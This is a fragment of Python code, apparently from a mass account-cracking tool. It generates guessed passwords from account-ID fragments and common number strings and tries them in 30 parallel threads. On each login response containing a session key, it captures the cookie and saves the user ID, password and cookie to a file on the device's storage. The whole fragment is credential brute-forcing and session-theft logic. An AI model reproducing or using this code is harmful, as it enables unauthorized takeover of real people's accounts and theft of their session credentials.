...
def bd():
                ...
                with tred(max_workers=30) as MRM:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [ids[:8],ids[:7],ids[:6],ids[5:],ids[3:],ids[4:],ids[2:],ids,'113355','112200','121234','506070','708090','203040']
        ...
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        if 'Photoshop' in po:
                        	...
                        	print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}");open('/sdcard/MRM-RNDM-OK.txt','a').write(uid+' | '+pas+' |-----> '+cookie+'\n');oks.append(uid);break
